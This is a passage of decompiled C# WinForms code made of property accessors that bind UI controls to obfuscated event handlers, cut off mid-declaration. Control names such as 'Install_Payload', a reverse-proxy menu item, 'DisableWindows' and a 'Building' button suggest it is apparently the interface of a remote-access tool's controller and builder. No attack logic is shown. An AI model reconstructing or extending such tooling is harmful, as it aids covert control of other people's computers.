	public virtual PictureBox PictureBox19
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_12;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_12 = value;
		}
	}

	public virtual PictureBox PictureBox21
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_13;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_13 = value;
		}
	}

	public virtual PictureBox PictureBox22
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_14;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_14 = value;
		}
	}

	public virtual Label Label13
	{
		[CompilerGenerated]
		get
		{
			return label_12;
		}
		[CompilerGenerated]
		set
		{
			label_12 = value;
		}
	}

	internal virtual Guna2RadialGauge ProgressBar1
	{
		[CompilerGenerated]
		get
		{
			return guna2RadialGauge_0;
		}
		[CompilerGenerated]
		set
		{
			guna2RadialGauge_0 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[CompilerGenerated]
		get
		{
			return linkLabel_0;
		}
		[CompilerGenerated]
		set
		{
			linkLabel_0 = value;
		}
	}

	public virtual PictureBox PictureBox20
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_15;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_15 = value;
		}
	}

	public virtual Label Label24
	{
		[CompilerGenerated]
		get
		{
			return label_13;
		}
		[CompilerGenerated]
		set
		{
			label_13 = value;
		}
	}

	public virtual Label Label32
	{
		[CompilerGenerated]
		get
		{
			return label_14;
		}
		[CompilerGenerated]
		set
		{
			label_14 = value;
		}
	}

	public virtual Label Label18
	{
		[CompilerGenerated]
		get
		{
			return label_15;
		}
		[CompilerGenerated]
		set
		{
			label_15 = value;
		}
	}

	public virtual Label Label14
	{
		[CompilerGenerated]
		get
		{
			return label_16;
		}
		[CompilerGenerated]
		set
		{
			label_16 = value;
		}
	}

	public virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return label_17;
		}
		[CompilerGenerated]
		set
		{
			label_17 = value;
		}
	}

	internal virtual Label SRR
	{
		[CompilerGenerated]
		get
		{
			return label_18;
		}
		[CompilerGenerated]
		set
		{
			label_18 = value;
		}
	}

	internal virtual Label Ftime
	{
		[CompilerGenerated]
		get
		{
			return label_19;
		}
		[CompilerGenerated]
		set
		{
			label_19 = value;
		}
	}

	internal virtual Label Flevel
	{
		[CompilerGenerated]
		get
		{
			return label_20;
		}
		[CompilerGenerated]
		set
		{
			label_20 = value;
		}
	}

	internal virtual Label Fname
	{
		[CompilerGenerated]
		get
		{
			return label_21;
		}
		[CompilerGenerated]
		set
		{
			label_21 = value;
		}
	}

	public virtual Panel Panel13
	{
		[CompilerGenerated]
		get
		{
			return panel_17;
		}
		[CompilerGenerated]
		set
		{
			panel_17 = value;
		}
	}

	public virtual Panel CCC
	{
		[CompilerGenerated]
		get
		{
			return panel_18;
		}
		[CompilerGenerated]
		set
		{
			panel_18 = value;
		}
	}

	internal virtual Guna2ContextMenuStrip Control
	{
		[CompilerGenerated]
		get
		{
			return guna2ContextMenuStrip_0;
		}
		[CompilerGenerated]
		set
		{
			guna2ContextMenuStrip_0 = value;
		}
	}

	internal virtual ToolStripMenuItem MyComputerToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_17;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_17 = value;
		}
	}

	internal virtual ToolStripMenuItem ManagerToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_18;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_18 = value;
		}
	}

	public virtual ContextMenuStrip ContextMenuStrip1
	{
		[CompilerGenerated]
		get
		{
			return contextMenuStrip_1;
		}
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_57;
			ContextMenuStrip contextMenuStrip = contextMenuStrip_1;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening -= value2;
			}
			contextMenuStrip_1 = value;
			contextMenuStrip = contextMenuStrip_1;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ManagerToolStripMenuItem2
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_19;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_41;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_19;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_19 = value;
			toolStripMenuItem = toolStripMenuItem_19;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ControllToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_20;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_43;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_20;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_20 = value;
			toolStripMenuItem = toolStripMenuItem_20;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem InformationsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_21;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_44;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_21;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_21 = value;
			toolStripMenuItem = toolStripMenuItem_21;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem InstallToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_22;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_59;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_22;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_22 = value;
			toolStripMenuItem = toolStripMenuItem_22;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RevarseProxyToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_23;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_23 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_24;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_74;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_24;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_24 = value;
			toolStripMenuItem = toolStripMenuItem_24;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem3
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_25;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_42;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_25;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_25 = value;
			toolStripMenuItem = toolStripMenuItem_25;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem DisableWindowsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_26;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_54;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_26;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_26 = value;
			toolStripMenuItem = toolStripMenuItem_26;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem4
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_27;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_27 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem5
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_28;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_56;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_28;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_28 = value;
			toolStripMenuItem = toolStripMenuItem_28;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem6
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_29;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_45;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_29;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_29 = value;
			toolStripMenuItem = toolStripMenuItem_29;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem7
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_30;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_46;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_30;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_30 = value;
			toolStripMenuItem = toolStripMenuItem_30;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem8
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_31;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_47;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_31;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_31 = value;
			toolStripMenuItem = toolStripMenuItem_31;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem9
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_32;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_48;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_32;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_32 = value;
			toolStripMenuItem = toolStripMenuItem_32;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem2
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_33;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_49;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_33;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_33 = value;
			toolStripMenuItem = toolStripMenuItem_33;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem10
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_34;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_61;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_34;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_34 = value;
			toolStripMenuItem = toolStripMenuItem_34;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem14
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_35;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_53;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_35;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_35 = value;
			toolStripMenuItem = toolStripMenuItem_35;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem18
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_36;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_50;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_36;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_36 = value;
			toolStripMenuItem = toolStripMenuItem_36;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual Label Label8
	{
		[CompilerGenerated]
		get
		{
			return label_22;
		}
		[CompilerGenerated]
		set
		{
			label_22 = value;
		}
	}

	internal virtual Guna2RadioButton D4
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_4;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_4 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem11
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_37;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_60;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_37;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_37 = value;
			toolStripMenuItem = toolStripMenuItem_37;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem23
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_38;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_64;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_38;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_38 = value;
			toolStripMenuItem = toolStripMenuItem_38;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem12
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_39;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_66;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_39;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_39 = value;
			toolStripMenuItem = toolStripMenuItem_39;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem FunToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_40;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_67;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_40;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_40 = value;
			toolStripMenuItem = toolStripMenuItem_40;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem13
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_41;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_69;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_41;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_41 = value;
			toolStripMenuItem = toolStripMenuItem_41;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem22
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_42;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_68;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_42;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_42 = value;
			toolStripMenuItem = toolStripMenuItem_42;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem24
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_43;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_65;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_43;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_43 = value;
			toolStripMenuItem = toolStripMenuItem_43;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	public virtual Panel Panel33
	{
		[CompilerGenerated]
		get
		{
			return panel_19;
		}
		[CompilerGenerated]
		set
		{
			panel_19 = value;
		}
	}

	public virtual Label Label12
	{
		[CompilerGenerated]
		get
		{
			return label_23;
		}
		[CompilerGenerated]
		set
		{
			label_23 = value;
		}
	}

	internal virtual Guna2CircleProgressBar USS
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_1;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_1 = value;
		}
	}

	internal virtual ListView ListView2
	{
		[CompilerGenerated]
		get
		{
			return listView_1;
		}
		[CompilerGenerated]
		set
		{
			listView_1 = value;
		}
	}

	internal virtual Guna2Button NONN
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_10;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_10 = value;
		}
	}

	public virtual Panel panel4
	{
		[CompilerGenerated]
		get
		{
			return panel_20;
		}
		[CompilerGenerated]
		set
		{
			panel_20 = value;
		}
	}

	internal virtual Guna2CircleProgressBar PLW
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_2;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_2 = value;
		}
	}

	public virtual Label CO
	{
		[CompilerGenerated]
		get
		{
			return label_24;
		}
		[CompilerGenerated]
		set
		{
			label_24 = value;
		}
	}

	public virtual Label label4
	{
		[CompilerGenerated]
		get
		{
			return label_25;
		}
		[CompilerGenerated]
		set
		{
			label_25 = value;
		}
	}

	internal virtual Guna2RadioButton D8
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_5;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_5 = value;
		}
	}

	internal virtual Label Label43
	{
		[CompilerGenerated]
		get
		{
			return label_26;
		}
		[CompilerGenerated]
		set
		{
			label_26 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Install_Payload
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = zbrbcgUxhS;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_0;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_0 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_0;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2RadioButton D2
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_6;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_6 = value;
		}
	}

	internal virtual Guna2RadioButton D6
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_7;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_7 = value;
		}
	}

	internal virtual ToolStripMenuItem ShowToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_44;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_11;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_44;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_44 = value;
			toolStripMenuItem = toolStripMenuItem_44;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem16
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_45;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_45 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem17
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_46;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_75;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_46;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_46 = value;
			toolStripMenuItem = toolStripMenuItem_46;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem20
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_47;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_76;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_47;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_47 = value;
			toolStripMenuItem = toolStripMenuItem_47;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem21
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_48;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_77;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_48;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_48 = value;
			toolStripMenuItem = toolStripMenuItem_48;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem25
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_49;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_78;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_49;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_49 = value;
			toolStripMenuItem = toolStripMenuItem_49;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem15
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_50;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_50 = value;
		}
	}

	internal virtual TabControl TabControl2
	{
		[CompilerGenerated]
		get
		{
			return tabControl_1;
		}
		[CompilerGenerated]
		set
		{
			tabControl_1 = value;
		}
	}

	internal virtual TabPage Connect1
	{
		[CompilerGenerated]
		get
		{
			return tabPage_4;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_79;
			TabPage tabPage = tabPage_4;
			if (tabPage != null)
			{
				tabPage.Click -= value2;
			}
			tabPage_4 = value;
			tabPage = tabPage_4;
			if (tabPage != null)
			{
				tabPage.Click += value2;
			}
		}
	}

	internal virtual TabPage Install1
	{
		[CompilerGenerated]
		get
		{
			return tabPage_5;
		}
		[CompilerGenerated]
		set
		{
			tabPage_5 = value;
		}
	}

	internal virtual TabPage Security1
	{
		[CompilerGenerated]
		get
		{
			return tabPage_6;
		}
		[CompilerGenerated]
		set
		{
			tabPage_6 = value;
		}
	}

	internal virtual TabPage TabPage6
	{
		[CompilerGenerated]
		get
		{
			return tabPage_7;
		}
		[CompilerGenerated]
		set
		{
			tabPage_7 = value;
		}
	}

	public virtual Panel Panel32
	{
		[CompilerGenerated]
		get
		{
			return panel_21;
		}
		[CompilerGenerated]
		set
		{
			panel_21 = value;
		}
	}

	internal virtual TabPage TabPage8
	{
		[CompilerGenerated]
		get
		{
			return tabPage_8;
		}
		[CompilerGenerated]
		set
		{
			tabPage_8 = value;
		}
	}

	internal virtual TabPage TabPage9
	{
		[CompilerGenerated]
		get
		{
			return tabPage_9;
		}
		[CompilerGenerated]
		set
		{
			tabPage_9 = value;
		}
	}

	public virtual Panel Panel23
	{
		[CompilerGenerated]
		get
		{
			return panel_22;
		}
		[CompilerGenerated]
		set
		{
			panel_22 = value;
		}
	}

	internal virtual TabPage TabPage3
	{
		[CompilerGenerated]
		get
		{
			return tabPage_10;
		}
		[CompilerGenerated]
		set
		{
			tabPage_10 = value;
		}
	}

	public virtual Panel Panel31
	{
		[CompilerGenerated]
		get
		{
			return panel_23;
		}
		[CompilerGenerated]
		set
		{
			panel_23 = value;
		}
	}

	public virtual Panel Panel34
	{
		[CompilerGenerated]
		get
		{
			return panel_24;
		}
		[CompilerGenerated]
		set
		{
			panel_24 = value;
		}
	}

	public virtual Panel Panel24
	{
		[CompilerGenerated]
		get
		{
			return panel_25;
		}
		[CompilerGenerated]
		set
		{
			panel_25 = value;
		}
	}

	internal virtual Guna2Button Building
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_11;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_80;
			Guna2Button guna2Button = guna2Button_11;
			if (guna2Button != null)
			{
				guna2Button.Click -= value2;
			}
			guna2Button_11 = value;
			guna2Button = guna2Button_11;
			if (guna2Button != null)
			{
				guna2Button.Click += value2;
			}
		}
	}

	internal virtual Guna2ToggleSwitch ZIS
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_123;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_1;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_1 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_1;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Label Label55
	{
		[CompilerGenerated]
		get
		{
			return label_27;
		}
		[CompilerGenerated]
		set
		{
			label_27 = value;
		}
	}

	internal virtual NumericUpDown Nu
	{
		[CompilerGenerated]
		get
		{
			return numericUpDown_0;
		}
		[CompilerGenerated]
		set
		{
			numericUpDown_0 = value;
		}
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return label_28;
		}
		[CompilerGenerated]
		set
		{
			label_28 = value;
		}
	}

	internal virtual Guna2RadioButton GB
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_8;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_8 = value;
		}
	}

	internal virtual Guna2RadioButton MB
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_9;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_9 = value;
		}
	}

	internal virtual Guna2RadioButton KB
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_10;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_10 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel4
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_0;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_0 = value;
		}
	}

	public virtual Button Button7
	{
		[CompilerGenerated]
		get
		{
			return button_7;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_132;
			Button button = button_7;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_7 = value;
			button = button_7;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Button Button6
	{
		[CompilerGenerated]
		get
		{
			return button_8;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_131;
			Button button = button_8;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_8 = value;
			button = button_8;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Button Button5
	{
		[CompilerGenerated]
		get
		{
			return button_9;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_130;
			Button button = button_9;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_9 = value;
			button = button_9;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Button Button4
	{
		[CompilerGenerated]
		get
		{
			return button_10;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_129;
			Button button = button_10;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_10 = value;
			button = button_10;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return button_11;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_105;
			Button button = button_11;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_11 = value;
			button = button_11;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return button_12;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_104;
			Button button = button_12;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_12 = value;
			button = button_12;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return button_13;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_103;
			Button button = button_13;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_13 = value;
			button = button_13;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel3
	{
